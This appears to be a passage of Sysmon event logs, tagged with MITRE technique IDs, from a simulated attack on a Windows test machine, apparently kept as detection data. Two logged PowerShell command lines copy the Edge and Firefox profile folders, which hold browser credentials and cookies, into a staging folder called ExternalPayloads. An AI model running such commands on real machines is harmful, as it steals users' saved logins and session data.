+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:18.069
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5706-656d-dd02-000000001000}
+TargetProcessId: 8772
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:18.073
+ProcessGuid: {1ac2ee8c-5706-656d-dd02-000000001000}
+ProcessId: 8772
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"""" -Destination \""""C:temp\..\ExternalPayloads\Edge\"""" -Force -Recurse}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:18 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:18.069
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:17 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:17.881
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:17 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:17.881
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:17 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:17.334
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:16.975
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+PipeName: \PSHost.133461381166818588.6564.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:16.896
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_er4ob34l.50t.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:16.865
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_er4ob34l.50t.ps1
+CreationUtcTime: 2023-12-04 04:35:16.865
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:16.834
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:16.787
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:16.787
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:16.787
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:16.771
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:16.771
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:16.677
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5704-656d-db02-000000001000}
+TargetProcessId: 6564
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:16.681
+ProcessGuid: {1ac2ee8c-5704-656d-db02-000000001000}
+ProcessId: 6564
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:APPDATA\Mozilla\Firefox\Profiles\\"""" -Destination \""""C:temp\..\ExternalPayloads\"""" -Force -Recurse}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:16.677
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:16.443
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:16 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:16.443
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:15.787
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:15.427
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+PipeName: \PSHost.133461381151989666.7028.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:15.334
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_mobtxuej.0ij.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:15.303
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_mobtxuej.0ij.ps1
+CreationUtcTime: 2023-12-04 04:35:15.303
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:15.272
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:15.240
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:15.225
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:15.225
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:15.225
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:15.209
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:15.193
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5703-656d-d902-000000001000}
+TargetProcessId: 7028
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
